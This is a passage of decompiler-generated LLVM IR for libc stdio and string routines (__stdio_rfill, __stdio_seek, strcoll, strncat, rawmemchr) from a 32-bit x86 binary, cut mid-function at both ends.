  store i32 %v1_805347f, i32* %ecx.global-to-local, align 4
  br i1 %v2_805347f, label %dec_label_pc_80534ae, label %dec_label_pc_8053484

dec_label_pc_8053484:                             ; preds = %entry
  %v1_8053486 = add nsw i32 %v1_805347f, -1
  %v8_8053486 = icmp eq i32 %v1_8053486, 0
  store i32 %v1_8053486, i32* @edx, align 4
  br i1 %v8_8053486, label %dec_label_pc_80534ae, label %dec_label_pc_8053489

dec_label_pc_8053489:                             ; preds = %dec_label_pc_8053484
  %v3_8053489 = and i32 %v2_8053478, 2048
  %v4_8053489 = icmp eq i32 %v3_8053489, 0
  br i1 %v4_8053489, label %dec_label_pc_80534ae, label %dec_label_pc_805348e

dec_label_pc_805348e:                             ; preds = %dec_label_pc_8053489
  %v6_805348e = sub nsw i32 1, %v1_805347f
  %v7_805348e = and i32 %v1_8053486, %v6_805348e
  %v8_805348e = icmp slt i32 %v7_805348e, 0
  %v9_805348e = icmp eq i32 %v1_805347f, 2
  %v10_805348e = icmp ult i32 %v1_805347f, 2
  %v3_8053491 = icmp eq i1 %v10_805348e, %v8_805348e
  %v4_8053491 = icmp eq i1 %v9_805348e, false
  %v5_8053491 = and i1 %v4_8053491, %v3_8053491
  br i1 %v5_8053491, label %dec_label_pc_8053504, label %dec_label_pc_8053493

dec_label_pc_8053493:                             ; preds = %dec_label_pc_805348e
  %v1_8053493 = add i32 %tmp6, 40
  %v2_8053493 = inttoptr i32 %v1_8053493 to i32*
  %v3_8053493 = load i32, i32* %v2_8053493, align 4
  %v4_8053493 = icmp eq i32 %v3_8053493, 0
  %v1_8053497 = icmp eq i1 %v4_8053493, false
  br i1 %v1_8053497, label %dec_label_pc_8053504, label %dec_label_pc_8053499

dec_label_pc_8053499:                             ; preds = %dec_label_pc_8053493
  %v1_8053499 = add i32 %tmp6, 3
  %v2_8053499 = inttoptr i32 %v1_8053499 to i8*
  %v3_8053499 = load i8, i8* %v2_8053499, align 1
  %v4_8053499 = zext i8 %v3_8053499 to i32
  %v2_805349d = sub nsw i32 %v1_8053486, %v4_8053499
  %v1_805349f = add i32 %tmp6, 44
  %v2_805349f = inttoptr i32 %v1_805349f to i32*
  %v3_805349f = load i32, i32* %v2_805349f, align 4
  %v1_80534a3 = add nsw i32 %v2_805349d, -1
  %tmp12 = icmp slt i32 %v3_805349f, 1
  br i1 %tmp12, label %dec_label_pc_80534ae, label %dec_label_pc_80534a8

dec_label_pc_80534a8:                             ; preds = %dec_label_pc_8053499
  %v1_80534a8 = add i32 %tmp6, 2
  %v2_80534a8 = inttoptr i32 %v1_80534a8 to i8*
  %v3_80534a8 = load i8, i8* %v2_80534a8, align 1
  %v4_80534a8 = zext i8 %v3_80534a8 to i32
  %v2_80534ac = sub nsw i32 %v1_80534a3, %v4_80534a8
  br label %dec_label_pc_80534ae

dec_label_pc_80534ae:                             ; preds = %dec_label_pc_8053499, %dec_label_pc_8053489, %dec_label_pc_8053484, %entry, %dec_label_pc_80534a8
  %v0_80534c5 = phi i32 [ %v1_80534a3, %dec_label_pc_8053499 ], [ %v1_8053486, %dec_label_pc_8053489 ], [ 0, %dec_label_pc_8053484 ], [ 0, %entry ], [ %v2_80534ac, %dec_label_pc_80534a8 ]
  %v2_80534ae = and i32 %v2_8053478, 64
  %v3_80534ae = icmp eq i32 %v2_80534ae, 0
  %storemerge.in.in.v = select i1 %v3_80534ae, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_80534bd = add i32 %tmp6, 16
  %v3_80534bd = inttoptr i32 %v2_80534bd to i32*
  %v4_80534bd = load i32, i32* %v3_80534bd, align 4
  %v5_80534bd = sub i32 %storemerge, %v4_80534bd
  %v1_80534c0 = inttoptr i32 %arg2 to i32*
  %v2_80534c0 = load i32, i32* %v1_80534c0, align 4
  store i32 %v2_80534c0, i32* %ecx.global-to-local, align 4
  %v1_80534c2 = add i32 %arg2, 4
  %v2_80534c2 = inttoptr i32 %v1_80534c2 to i32*
  %v3_80534c2 = load i32, i32* %v2_80534c2, align 4
  store i32 %v3_80534c2, i32* %ebx.global-to-local, align 4
  %v2_80534c5 = add i32 %v5_80534bd, %v0_80534c5
  store i32 %v2_80534c5, i32* %esi.global-to-local, align 4
  %v2_80534d0 = ashr i32 %v2_80534c5, 31
  %v5_80534d9 = sub i32 %v2_80534c0, %v2_80534c5
  %v10_80534d9 = icmp ult i32 %v2_80534c0, %v2_80534c5
  %v6_80534dd = zext i1 %v10_80534d9 to i32
  %tmp = icmp slt i32 %v2_80534c5, 0
  %v2_80534d0.neg = zext i1 %tmp to i32
  %v7_80534dd = add i32 %v3_80534c2, %v2_80534d0.neg
  %v8_80534dd = add i32 %v7_80534dd, %v6_80534dd
  store i32 %v8_80534dd, i32* @edx, align 4
  store i32 %v5_80534d9, i32* %v1_80534c0, align 4
  %v0_80534e3 = load i32, i32* @edx, align 4
  %v1_80534e3 = load i32, i32* %edi.global-to-local, align 4
  %v2_80534e3 = add i32 %v1_80534e3, 4
  %v3_80534e3 = inttoptr i32 %v2_80534e3 to i32*
  store i32 %v0_80534e3, i32* %v3_80534e3, align 4
  %v0_80534e6 = load i32, i32* %edi.global-to-local, align 4
  %v1_80534e6 = add i32 %v0_80534e6, 4
  %v2_80534e6 = inttoptr i32 %v1_80534e6 to i32*
  %v3_80534e6 = load i32, i32* %v2_80534e6, align 4
  %v4_80534e6 = load i32, i32* %ebx.global-to-local, align 4
  %v5_80534e9 = icmp slt i32 %v3_80534e6, %v4_80534e6
  br i1 %v5_80534e9, label %dec_label_pc_80534f3, label %dec_label_pc_80534eb

dec_label_pc_80534eb:                             ; preds = %dec_label_pc_80534ae
  %v8_80534eb = icmp sgt i32 %v3_80534e6, %v4_80534e6
  br i1 %v8_80534eb, label %dec_label_pc_80534f1, label %dec_label_pc_80534ed

dec_label_pc_80534ed:                             ; preds = %dec_label_pc_80534eb
  %v1_80534ed = inttoptr i32 %v0_80534e6 to i32*
  %v2_80534ed = load i32, i32* %v1_80534ed, align 4
  %v3_80534ed = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_80534ed, %v3_80534ed
  br i1 %tmp14, label %dec_label_pc_80534f1, label %dec_label_pc_80534f3

dec_label_pc_80534f1:                             ; preds = %dec_label_pc_80534ed, %dec_label_pc_80534eb
  %v0_80534f1 = load i32, i32* %esi.global-to-local, align 4
  %v1_80534f1 = sub i32 0, %v0_80534f1
  store i32 %v1_80534f1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80534f3

dec_label_pc_80534f3:                             ; preds = %dec_label_pc_80534ed, %dec_label_pc_80534ae, %dec_label_pc_80534f1
  %v0_80534f3 = load i32, i32* %esi.global-to-local, align 4
  %v2_80534f3 = icmp slt i32 %v0_80534f3, 0
  %v1_80534f5 = icmp eq i1 %v2_80534f3, false
  br i1 %v1_80534f5, label %dec_label_pc_8053507, label %dec_label_pc_80534f7

dec_label_pc_80534f7:                             ; preds = %dec_label_pc_80534f3
  %v1_80534f7 = call i32 @__errno_location(i32 %v2_80534d0)
  %v1_80534fc = inttoptr i32 %v1_80534f7 to i32*
  store i32 75, i32* %v1_80534fc, align 4
  %v0_805350a.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053507

dec_label_pc_8053504:                             ; preds = %dec_label_pc_8053493, %dec_label_pc_805348e
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053507

dec_label_pc_8053507:                             ; preds = %dec_label_pc_80534f3, %dec_label_pc_80534f7, %dec_label_pc_8053504
  %v0_805350a = phi i32 [ %v0_80534f3, %dec_label_pc_80534f3 ], [ %v0_805350a.pre, %dec_label_pc_80534f7 ], [ -1, %dec_label_pc_8053504 ]
  ret i32 %v0_805350a

; uselistorder directives
  uselistorder i32 %v4_80534e6, { 1, 0 }
  uselistorder i32 %v3_80534e6, { 1, 0 }
  uselistorder i32 %v1_8053486, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_805347f, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_8053478, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 2048, { 2, 1, 6, 3, 5, 0, 8, 4, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053507, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80534f3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80534ae, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8053510 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8053518 = add i32 %arg1, 8
  %v2_8053518 = inttoptr i32 %v1_8053518 to i32*
  %v3_8053518 = load i32, i32* %v2_8053518, align 4
  store i32 %v3_8053518, i32* %edx.global-to-local, align 4
  %v1_805351b = add i32 %arg1, 12
  %v2_805351b = inttoptr i32 %v1_805351b to i32*
  %v3_805351b = load i32, i32* %v2_805351b, align 4
  %v2_805351e = sub i32 %v3_805351b, %v3_8053518
  %v3_8053523 = inttoptr i32 %arg1 to i16*
  %v4_8053523 = call i32 @__stdio_READ(i16* %v3_8053523, i32 %v3_8053518, i32 %v2_805351e)
  %v0_8053528 = load i32, i32* @ebx, align 4
  %v1_8053528 = add i32 %v0_8053528, 8
  %v2_8053528 = inttoptr i32 %v1_8053528 to i32*
  %v3_8053528 = load i32, i32* %v2_8053528, align 4
  store i32 %v3_8053528, i32* %edx.global-to-local, align 4
  %v2_805352b = add i32 %v0_8053528, 16
  %v3_805352b = inttoptr i32 %v2_805352b to i32*
  store i32 %v3_8053528, i32* %v3_805352b, align 4
  %v0_805352e = load i32, i32* %edx.global-to-local, align 4
  %v2_805352e = add i32 %v0_805352e, %v4_8053523
  store i32 %v2_805352e, i32* %edx.global-to-local, align 4
  %v1_8053530 = load i32, i32* @ebx, align 4
  %v2_8053530 = add i32 %v1_8053530, 20
  %v3_8053530 = inttoptr i32 %v2_8053530 to i32*
  store i32 %v2_805352e, i32* %v3_8053530, align 4
  store i32 %v0_8053510, i32* @ebx, align 4
  ret i32 %v4_8053523

; uselistorder directives
  uselistorder i32 %v4_8053523, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8053538 = load i32, i32* @ebx, align 4
  %v4_805353c = ptrtoint i16* %arg1 to i32
  store i32 %v4_805353c, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8053544 = bitcast i16* %arg1 to i32*
  %v2_8053544 = load i32, i32* %v1_8053544, align 4
  %v1_8053546 = urem i32 %v2_8053544, 65536
  %v2_8053549 = and i32 %v1_8053546, %arg2
  %v3_8053549 = icmp eq i32 %v2_8053549, 0
  %v1_805354b = icmp eq i1 %v3_8053549, false
  br i1 %v1_805354b, label %dec_label_pc_805355a, label %dec_label_pc_805354d

dec_label_pc_805354d:                             ; preds = %entry
  %v1_805354d = and i32 %v2_8053544, 2176
  %v2_805354d = icmp eq i32 %v1_805354d, 0
  %v1_8053553 = icmp eq i1 %v2_805354d, false
  br i1 %v1_8053553, label %dec_label_pc_8053561, label %dec_label_pc_8053555

dec_label_pc_8053555:                             ; preds = %dec_label_pc_805354d
  %v2_8053555 = or i32 %v2_8053544, %arg2
  %v1_8053557 = trunc i32 %v2_8053555 to i16
  store i16 %v1_8053557, i16* %arg1, align 2
  %v0_805355a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805355a

dec_label_pc_805355a:                             ; preds = %entry, %dec_label_pc_8053555
  %v0_805357c = phi i32 [ %v4_805353c, %entry ], [ %v0_805355a.pre, %dec_label_pc_8053555 ]
  %v1_805355a = inttoptr i32 %v0_805357c to i16*
  %v2_805355a = load i16, i16* %v1_805355a, align 2
  %v2_805355d = and i16 %v2_805355a, 16
  %v3_805355d = icmp eq i16 %v2_805355d, 0
  br i1 %v3_805355d, label %dec_label_pc_8053575, label %dec_label_pc_8053561

dec_label_pc_8053561:                             ; preds = %dec_label_pc_805355a, %dec_label_pc_805354d
  %v1_8053561 = call i32 @__errno_location(i32 %v0_8053538)
  %v1_8053566 = inttoptr i32 %v1_8053561 to i32*
  store i32 9, i32* %v1_8053566, align 4
  br label %dec_label_pc_805356c

dec_label_pc_805356c:                             ; preds = %dec_label_pc_8053579, %dec_label_pc_8053561
  %v0_805356c = load i32, i32* @ebx, align 4
  %v1_805356c = inttoptr i32 %v0_805356c to i16*
  %v2_805356c = load i16, i16* %v1_805356c, align 2
  %v3_805356c = or i16 %v2_805356c, 8
  store i16 %v3_805356c, i16* %v1_805356c, align 2
  br label %dec_label_pc_8053599

dec_label_pc_8053575:                             ; preds = %dec_label_pc_805355a
  %v2_8053575 = and i16 %v2_805355a, 64
  %v3_8053575 = icmp eq i16 %v2_8053575, 0
  br i1 %v3_8053575, label %dec_label_pc_8053593, label %dec_label_pc_8053579

dec_label_pc_8053579:                             ; preds = %dec_label_pc_8053575
  %v2_805357d = call i32 @__stdio_wcommit(i32 %v0_805357c)
  %v1_8053585 = icmp eq i32 %v2_805357d, 0
  %v1_8053587 = icmp eq i1 %v1_8053585, false
  br i1 %v1_8053587, label %dec_label_pc_805356c, label %dec_label_pc_8053589

dec_label_pc_8053589:                             ; preds = %dec_label_pc_8053579
  %v0_8053589 = load i32, i32* @ebx, align 4
  %v1_8053589 = inttoptr i32 %v0_8053589 to i16*
  %v2_8053589 = load i16, i16* %v1_8053589, align 2
  %v3_8053589 = and i16 %v2_8053589, -65
  store i16 %v3_8053589, i16* %v1_8053589, align 2
  %v0_805358d = load i32, i32* @ebx, align 4
  %v1_805358d = add i32 %v0_805358d, 8
  %v2_805358d = inttoptr i32 %v1_805358d to i32*
  %v3_805358d = load i32, i32* %v2_805358d, align 4
  %v2_8053590 = add i32 %v0_805358d, 28
  %v3_8053590 = inttoptr i32 %v2_8053590 to i32*
  store i32 %v3_805358d, i32* %v3_8053590, align 4
  %v0_8053593.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053593

dec_label_pc_8053593:                             ; preds = %dec_label_pc_8053575, %dec_label_pc_8053589
  %v9_8053593 = phi i32 [ %v0_805357c, %dec_label_pc_8053575 ], [ %v0_8053593.pre, %dec_label_pc_8053589 ]
  %v1_8053593 = inttoptr i32 %v9_8053593 to i16*
  %v2_8053593 = load i16, i16* %v1_8053593, align 2
  %v3_8053593 = or i16 %v2_8053593, 1
  store i16 %v3_8053593, i16* %v1_8053593, align 2
  br label %dec_label_pc_8053599

dec_label_pc_8053599:                             ; preds = %dec_label_pc_805356c, %dec_label_pc_8053593
  %storemerge = phi i32 [ 0, %dec_label_pc_8053593 ], [ -1, %dec_label_pc_805356c ]
  store i32 %v0_8053538, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_8053544, { 1, 2, 0 }
  uselistorder i32 %v0_8053538, { 1, 0 }
  uselistorder i16 1, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i16 8, { 3, 4, 0, 1, 5, 2 }
  uselistorder i16 0, { 0, 7, 1, 8, 5, 6, 9, 10, 11, 12, 13, 14, 15, 2, 3, 4 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053599, { 1, 0 }
  uselistorder label %dec_label_pc_8053593, { 1, 0 }
  uselistorder label %dec_label_pc_805355a, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_80535ac = add i32 %tmp5, 4
  %v2_80535ac = inttoptr i32 %v1_80535ac to i32*
  %v3_80535ac = load i32, i32* %v2_80535ac, align 4
  %v2_80535af = load i32, i32* %arg2, align 4
  %v1_80535b5 = add i32 %arg1, 4
  %v2_80535b5 = inttoptr i32 %v1_80535b5 to i32*
  %v3_80535b5 = load i32, i32* %v2_80535b5, align 4
  %v4_80535b8 = call i32 @__libc_lseek64(i32 %v3_80535b5, i32 %v2_80535af, i32 %v3_80535ac, i32 %arg3)
  %v0_80535c2 = load i32, i32* @edx, align 4
  %v2_80535c2 = icmp slt i32 %v0_80535c2, 0
  br i1 %v2_80535c2, label %dec_label_pc_80535cd, label %dec_label_pc_80535c6

dec_label_pc_80535c6:                             ; preds = %entry
  %v1_80535c6 = load i32, i32* @ebx, align 4
  %v2_80535c6 = inttoptr i32 %v1_80535c6 to i32*
  store i32 %v4_80535b8, i32* %v2_80535c6, align 4
  %v0_80535c8 = load i32, i32* @edx, align 4
  %v1_80535c8 = load i32, i32* @ebx, align 4
  %v2_80535c8 = add i32 %v1_80535c8, 4
  %v3_80535c8 = inttoptr i32 %v2_80535c8 to i32*
  store i32 %v0_80535c8, i32* %v3_80535c8, align 4
  br label %dec_label_pc_80535cd

dec_label_pc_80535cd:                             ; preds = %entry, %dec_label_pc_80535c6
  %v0_80535cd = phi i32 [ %v4_80535b8, %entry ], [ 0, %dec_label_pc_80535c6 ]
  ret i32 %v0_80535cd

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_80535cd, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_80535d6 = ptrtoint i8* %arg1 to i32
  %v4_80535de.pre = load i32, i32* @eax, align 4
  %v8_80535de.pre = load i1, i1* @df, align 1
  %v9_80535de = select i1 %v8_80535de.pre, i32 -1, i32 1
  br label %dec_label_pc_80535de

dec_label_pc_80535de:                             ; preds = %dec_label_pc_80535e2, %entry
  %v20_80535df = phi i32 [ %v23_80535df, %dec_label_pc_80535e2 ], [ %arg2, %entry ]
  %v4_80535de = phi i32 [ %v6_80535de, %dec_label_pc_80535e2 ], [ %v4_80535de.pre, %entry ]
  %v7_80535de = phi i32 [ %v10_80535de, %dec_label_pc_80535e2 ], [ %v4_80535d6, %entry ]
  %v1_80535de = inttoptr i32 %v7_80535de to i8*
  %v2_80535de = load i8, i8* %v1_80535de, align 1
  %v3_80535df = inttoptr i32 %v20_80535df to i8*
  %v4_80535df = load i8, i8* %v3_80535df, align 1
  %v15_80535df = icmp eq i8 %v2_80535de, %v4_80535df
  %v1_80535e0 = icmp eq i1 %v15_80535df, false
  br i1 %v1_80535e0, label %dec_label_pc_80535ea, label %dec_label_pc_80535e2

dec_label_pc_80535e2:                             ; preds = %dec_label_pc_80535de
  %v3_80535de = zext i8 %v2_80535de to i32
  %v5_80535de = and i32 %v4_80535de, -256
  %v6_80535de = or i32 %v3_80535de, %v5_80535de
  %v23_80535df = add i32 %v20_80535df, %v9_80535de
  %v10_80535de = add i32 %v7_80535de, %v9_80535de
  %v4_80535e2 = icmp eq i8 %v2_80535de, 0
  %v1_80535e4 = icmp eq i1 %v4_80535e2, false
  br i1 %v1_80535e4, label %dec_label_pc_80535de, label %dec_label_pc_80535ee

dec_label_pc_80535ea:                             ; preds = %dec_label_pc_80535de
  br label %dec_label_pc_80535ee

dec_label_pc_80535ee:                             ; preds = %dec_label_pc_80535e2, %dec_label_pc_80535ea
  %storemerge = phi i32 [ 1, %dec_label_pc_80535ea ], [ 0, %dec_label_pc_80535e2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_80535de, { 1, 2, 0 }
  uselistorder i32 %v9_80535de, { 1, 0 }
  uselistorder label %dec_label_pc_80535ee, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_80535f5 = load i32, i32* @esi, align 4
  store i32 %v0_80535f5, i32* %stack_var_-8, align 4
  %v4_80535f6 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_80535f6, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_8053603 = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8053607 = call i32 @_strlen(i8* %v4_8053603)
  %v2_8053609 = add i32 %tmp, -1
  store i32 %v2_8053609, i32* %edi.global-to-local, align 4
  %v0_805360a = load i32, i32* %edx.global-to-local, align 4
  %v8_805360d10 = icmp eq i32 %v0_805360a, 0
  store i32 %v0_805360a, i32* %ecx.global-to-local, align 4
  br i1 %v8_805360d10, label %dec_label_pc_8053618, label %dec_label_pc_8053610.lr.ph

dec_label_pc_8053610.lr.ph:                       ; preds = %entry
  %v4_8053610.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8053610.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8053610

dec_label_pc_8053610:                             ; preds = %dec_label_pc_8053610.lr.ph, %dec_label_pc_8053610.dec_label_pc_805360d_crit_edge
  %v8_8053610 = phi i1 [ %v8_8053610.pre, %dec_label_pc_8053610.lr.ph ], [ %v5_8053611, %dec_label_pc_8053610.dec_label_pc_805360d_crit_edge ]
  %v4_8053610 = phi i32 [ %v4_8053610.pre, %dec_label_pc_8053610.lr.ph ], [ %v0_8053612, %dec_label_pc_8053610.dec_label_pc_805360d_crit_edge ]
  %v2_805361a11 = phi i32 [ %v2_8053609, %dec_label_pc_8053610.lr.ph ], [ %v7_8053611, %dec_label_pc_8053610.dec_label_pc_805360d_crit_edge ]
  %v0_8053610 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053610 = inttoptr i32 %v0_8053610 to i8*
  %v2_8053610 = load i8, i8* %v1_8053610, align 1
  %v3_8053610 = zext i8 %v2_8053610 to i32
  %v5_8053610 = and i32 %v4_8053610, -256
  %v6_8053610 = or i32 %v5_8053610, %v3_8053610
  store i32 %v6_8053610, i32* %eax.global-to-local, align 4
  %v9_8053610 = select i1 %v8_8053610, i32 -1, i32 1
  %v10_8053610 = add i32 %v9_8053610, %v0_8053610
  store i32 %v10_8053610, i32* %esi.global-to-local, align 4
  %v3_8053611 = inttoptr i32 %v2_805361a11 to i8*
  store i8 %v2_8053610, i8* %v3_8053611, align 1
  %v4_8053611 = load i32, i32* %edi.global-to-local, align 4
  %v5_8053611 = load i1, i1* @df, align 1
  %v6_8053611 = select i1 %v5_8053611, i32 -1, i32 1
  %v7_8053611 = add i32 %v6_8053611, %v4_8053611
  store i32 %v7_8053611, i32* %edi.global-to-local, align 4
  %v0_8053612 = load i32, i32* %eax.global-to-local, align 4
  %v3_8053612 = trunc i32 %v0_8053612 to i8
  %v4_8053612 = icmp eq i8 %v3_8053612, 0
  %v1_8053614 = icmp eq i1 %v4_8053612, false
  br i1 %v1_8053614, label %dec_label_pc_8053610.dec_label_pc_805360d_crit_edge, label %dec_label_pc_805361b

dec_label_pc_8053610.dec_label_pc_805360d_crit_edge: ; preds = %dec_label_pc_8053610
  %v0_805360d.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_805360d = add i32 %v0_805360d.pre, -1
  %v8_805360d = icmp eq i32 %v1_805360d, 0
  store i32 %v1_805360d, i32* %ecx.global-to-local, align 4
  br i1 %v8_805360d, label %dec_label_pc_8053618, label %dec_label_pc_8053610

dec_label_pc_8053618:                             ; preds = %dec_label_pc_8053610.dec_label_pc_805360d_crit_edge, %entry
  %v2_805361a.lcssa = phi i32 [ %v2_8053609, %entry ], [ %v7_8053611, %dec_label_pc_8053610.dec_label_pc_805360d_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_805361a = inttoptr i32 %v2_805361a.lcssa to i8*
  store i8 0, i8* %v3_805361a, align 1
  %v4_805361a = load i32, i32* %edi.global-to-local, align 4
  %v5_805361a = load i1, i1* @df, align 1
  %v6_805361a = select i1 %v5_805361a, i32 -1, i32 1
  %v7_805361a = add i32 %v6_805361a, %v4_805361a
  store i32 %v7_805361a, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805361b

dec_label_pc_805361b:                             ; preds = %dec_label_pc_8053610, %dec_label_pc_8053618
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_805361f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805361f, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_805360d, { 1, 0 }
  uselistorder i32 %v0_8053612, { 1, 0 }
  uselistorder i32 %v7_8053611, { 0, 2, 1 }
  uselistorder i1 %v5_8053611, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_805361b, { 1, 0 }
  uselistorder label %dec_label_pc_8053610, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8053625 = load i32, i32* @ebx, align 4
  %v4_8053626 = urem i32 %arg2, 256
  %v4_805362a = ptrtoint i8* %arg1 to i32
  %v2_80536353 = urem i32 %v4_805362a, 4
  %v3_80536354 = icmp eq i32 %v2_80536353, 0
  %v1_80536378 = icmp eq i1 %v3_80536354, false
  %v4_8053630 = trunc i32 %arg2 to i8
  br i1 %v1_80536378, label %dec_label_pc_8053630, label %dec_label_pc_8053639

dec_label_pc_8053630:                             ; preds = %entry, %dec_label_pc_8053634
  %v0_8053634 = phi i32 [ %v1_8053634, %dec_label_pc_8053634 ], [ %v4_805362a, %entry ]
  %v1_8053630 = inttoptr i32 %v0_8053634 to i8*
  %v2_8053630 = load i8, i8* %v1_8053630, align 1
  %v15_8053630 = icmp eq i8 %v2_8053630, %v4_8053630
  br i1 %v15_8053630, label %dec_label_pc_8053684, label %dec_label_pc_8053634

dec_label_pc_8053634:                             ; preds = %dec_label_pc_8053630
  %v1_8053634 = add i32 %v0_8053634, 1
  %v2_8053635 = urem i32 %v1_8053634, 4
  %v3_8053635 = icmp eq i32 %v2_8053635, 0
  %v1_8053637 = icmp eq i1 %v3_8053635, false
  br i1 %v1_8053637, label %dec_label_pc_8053630, label %dec_label_pc_8053639

dec_label_pc_8053639:                             ; preds = %entry, %dec_label_pc_8053634
  %v0_805363c = phi i32 [ %v1_8053634, %dec_label_pc_8053634 ], [ %v4_805362a, %entry ]
  %v2_8053640 = mul nuw nsw i32 %v4_8053626, 256
  %v2_8053643 = or i32 %v2_8053640, %v4_8053626
  %v2_8053647 = mul i32 %v2_8053643, 65536
  %v2_805364a = or i32 %v2_8053647, %v2_8053643
  br label %dec_label_pc_805364c

dec_label_pc_805364c:                             ; preds = %dec_label_pc_805367c, %dec_label_pc_805364c, %dec_label_pc_8053639
  %v0_8053650 = phi i32 [ %v0_805363c, %dec_label_pc_8053639 ], [ %v1_8053650, %dec_label_pc_805364c ], [ %v1_8053650, %dec_label_pc_805367c ]
  %v2_805364e = inttoptr i32 %v0_8053650 to i32*
  %v3_805364e = load i32, i32* %v2_805364e, align 4
  %v4_805364e = xor i32 %v3_805364e, %v2_805364a
  %v1_8053650 = add i32 %v0_8053650, 4
  store i32 %v1_8053650, i32* @ecx, align 4
  %v1_8053653 = add i32 %v4_805364e, 2130640639
  %v1_8053659 = sub i32 -1, %v4_805364e
  store i32 %v1_8053659, i32* @edx, align 4
  %v2_805365b = xor i32 %v1_8053653, %v1_8053659
  %v1_805365d = and i32 %v2_805365b, -2130640640
  %v2_805365d = icmp eq i32 %v1_805365d, 0
  br i1 %v2_805365d, label %dec_label_pc_805364c, label %dec_label_pc_8053664

dec_label_pc_8053664:                             ; preds = %dec_label_pc_805364c
  %v2_8053667 = inttoptr i32 %v0_8053650 to i8*
  %v3_8053667 = load i8, i8* %v2_8053667, align 1
  %v16_8053667 = icmp eq i8 %v3_8053667, %v4_8053630
  br i1 %v16_8053667, label %dec_label_pc_8053684, label %dec_label_pc_805366c

dec_label_pc_805366c:                             ; preds = %dec_label_pc_8053664
  %v1_805366c = add i32 %v0_8053650, 1
  %v2_805366f = inttoptr i32 %v1_805366c to i8*
  %v3_805366f = load i8, i8* %v2_805366f, align 1
  %v16_805366f = icmp eq i8 %v3_805366f, %v4_8053630
  br i1 %v16_805366f, label %dec_label_pc_8053684, label %dec_label_pc_8053674

dec_label_pc_8053674:                             ; preds = %dec_label_pc_805366c
  %v1_8053674 = add i32 %v0_8053650, 2
  %v2_8053677 = inttoptr i32 %v1_8053674 to i8*
  %v3_8053677 = load i8, i8* %v2_8053677, align 1
  %v16_8053677 = icmp eq i8 %v3_8053677, %v4_8053630
  br i1 %v16_8053677, label %dec_label_pc_8053684, label %dec_label_pc_805367c

dec_label_pc_805367c:                             ; preds = %dec_label_pc_8053674
  %v1_805367c = add i32 %v0_8053650, 3
  %v2_805367f = inttoptr i32 %v1_805367c to i8*
  %v3_805367f = load i8, i8* %v2_805367f, align 1
  %v16_805367f = icmp eq i8 %v3_805367f, %v4_8053630
